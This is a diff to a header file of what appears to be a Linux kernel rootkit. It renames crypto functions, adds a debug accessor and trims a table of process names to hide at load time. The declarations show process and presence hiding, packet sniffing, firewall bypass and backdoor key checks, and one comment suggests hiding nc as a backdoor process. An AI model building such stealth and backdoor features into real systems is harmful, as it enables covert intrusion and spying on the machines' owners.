@@ -86,13 +86,13 @@ struct kernel_syscalls {
 typedef void (*decrypt_callback)(const u8 *const buf, size_t buflen,
 				 size_t copied, void *userdata);
 /** Setup crypto module */
-int kv_crypto_key_init(void);
-struct kv_crypto_st *crypto_init(void);
+int kv_crypto_engine_init(void);
+struct kv_crypto_st *kv_crypto_mgc_init(void);
 size_t kv_encrypt(struct kv_crypto_st *, u8 *, size_t);
 size_t kv_decrypt(struct kv_crypto_st *, decrypt_callback, void *userdata);
 void kv_crypto_free_data(struct kv_crypto_st *);
 void kv_crypto_mgc_deinit(struct kv_crypto_st *);
-void kv_crypto_deinit(void);
+void kv_crypto_engine_deinit(void);
 
 /** hooks, hiding presence and so */
 bool sys_init(void);
@@ -127,6 +127,9 @@ struct task_struct *kv_sock_start_sniff(void);
 bool kv_sock_start_fw_bypass(void);
 void kv_sock_stop_sniff(struct task_struct *tsk);
 void kv_sock_stop_fw_bypass(void);
+#ifdef DEBUG_RING_BUFFER
+struct kv_crypto_st *kv_sock_get_mgc(void);
+#endif
 bool kv_bd_search_iph_source(__be32 saddr);
 bool kv_check_bdkey(struct tcphdr *, struct sk_buff *);
 void kv_bd_cleanup_item(__be32 *);
@@ -161,12 +164,6 @@ struct _kv_hide_ps_on_load {
   * Hide these process names at insmod
  */
 static struct _kv_hide_ps_on_load kv_hide_ps_on_load[] = {
-	{ "whitenose-example", KV_TASK },
-	{ "pinknose-example", KV_TASK },
-	{ "rednose-example", KV_TASK },
-	{ "blacknose-example", KV_TASK },
-	{ "greynose-example", KV_TASK },
-	{ "purplenose-example", KV_TASK },
 
 	// Uncomment, recompile and try nc:
 	//{"nc", KV_TASK_BD},
